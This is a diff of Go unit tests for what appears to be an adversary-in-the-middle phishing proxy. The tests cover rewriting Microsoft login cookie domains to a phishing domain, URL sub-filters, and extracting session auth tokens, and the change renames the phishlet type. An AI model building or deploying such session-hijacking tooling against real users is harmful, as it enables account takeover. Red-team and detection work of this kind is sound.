@@ -71,12 +71,12 @@ func TestCookieRewriter_RewritesDomain(t *testing.T) {
 	resp.Header.Set("Set-Cookie", "session=abc123; Domain=login.microsoft.com; Path=/; Secure")
 
 	ctx := &aitm.ProxyContext{
-		Phishlet: &aitm.PhishletDef{
+		Phishlet: &aitm.Phishlet{
 			ProxyHosts: []aitm.ProxyHost{
 				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
 			},
+			BaseDomain: "phish.example.com",
 		},
-		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
@@ -126,7 +126,7 @@ func TestSubFilterApplier_ReplacesURL(t *testing.T) {
 	}
 
 	ctx := &aitm.ProxyContext{
-		Phishlet: &aitm.PhishletDef{
+		Phishlet: &aitm.Phishlet{
 			SubFilters: []aitm.SubFilter{
 				{
 					MimeTypes: []string{"text/html"},
@@ -153,7 +153,7 @@ func TestSubFilterApplier_SkipsNonMutableMIME(t *testing.T) {
 	resp := newResp(http.StatusOK, "image/png", body)
 
 	ctx := &aitm.ProxyContext{
-		Phishlet: &aitm.PhishletDef{
+		Phishlet: &aitm.Phishlet{
 			SubFilters: []aitm.SubFilter{
 				{
 					MimeTypes: []string{"text/html"},
@@ -333,12 +333,12 @@ func TestCookieRewriter_RewritesDomainAndForcesSecure(t *testing.T) {
 	resp.Header.Set("Set-Cookie", "session=abc; Domain=login.microsoft.com; Path=/")
 
 	ctx := &aitm.ProxyContext{
-		Phishlet: &aitm.PhishletDef{
+		Phishlet: &aitm.Phishlet{
 			ProxyHosts: []aitm.ProxyHost{
 				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
 			},
+			BaseDomain: "phish.example.com",
 		},
-		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
@@ -359,8 +359,7 @@ func TestCookieRewriter_NoDomain_PassesThrough(t *testing.T) {
 	resp.Header.Set("Set-Cookie", "tok=xyz; Path=/; HttpOnly")
 
 	ctx := &aitm.ProxyContext{
-		Phishlet:   &aitm.PhishletDef{},
-		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
+		Phishlet: &aitm.Phishlet{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
@@ -386,7 +385,7 @@ func (s *stubTokenStore) UpdateSession(sess *aitm.Session) error {
 
 type stubCompleter struct{ complete bool }
 
-func (s *stubCompleter) IsComplete(_ *aitm.Session, _ *aitm.PhishletDef) bool { return s.complete }
+func (s *stubCompleter) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool { return s.complete }
 
 type stubWhitelister struct{ ip string }
 
@@ -405,7 +404,7 @@ func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
 
 	ctx := &aitm.ProxyContext{
 		Session: &aitm.Session{ID: "sess-1"},
-		Phishlet: &aitm.PhishletDef{
+		Phishlet: &aitm.Phishlet{
 			AuthTokens: []aitm.TokenRule{
 				{Type: aitm.TokenTypeCookie, Name: regexp.MustCompile(`^authToken$`)},
 			},
@@ -456,7 +455,7 @@ func TestTokenExtractor_SessionCompleted_PublishesEvent(t *testing.T) {
 	ctx := &aitm.ProxyContext{
 		ClientIP: "1.2.3.4",
 		Session:  &aitm.Session{ID: "sess-1"},
-		Phishlet: &aitm.PhishletDef{},
+		Phishlet: &aitm.Phishlet{},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
